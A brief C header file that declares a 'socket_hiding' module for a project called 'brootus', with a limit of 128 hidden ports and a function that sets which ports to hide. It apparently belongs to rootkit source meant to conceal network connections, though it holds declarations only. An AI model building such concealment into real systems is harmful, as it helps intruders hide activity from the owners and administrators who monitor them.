#ifndef SOCKET_HIDING_H
#define SOCKET_HIDING_H value

#include "brootus.h"

#define MAX_HIDE_PORTS 128

BROOTUS_MODULE(socket_hiding);

extern void set_socket_ports(char* ports);

#endif
